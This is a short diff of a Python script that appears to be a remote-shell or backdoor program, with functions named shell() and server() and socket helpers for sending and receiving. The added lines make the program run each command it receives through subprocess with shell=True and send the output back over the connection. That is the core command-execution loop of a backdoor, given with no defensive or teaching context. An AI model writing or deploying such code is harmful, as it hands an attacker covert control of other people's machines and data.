@@ -21,8 +21,9 @@ def shell():
     if command=="q":
         break
     else:
-        result=reliable_recv(1024)
-        print(result)
+        proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result=proc.stdout.read()+proc.stderr.read()
+        reliable_send(result)
      
 def server():
       global s
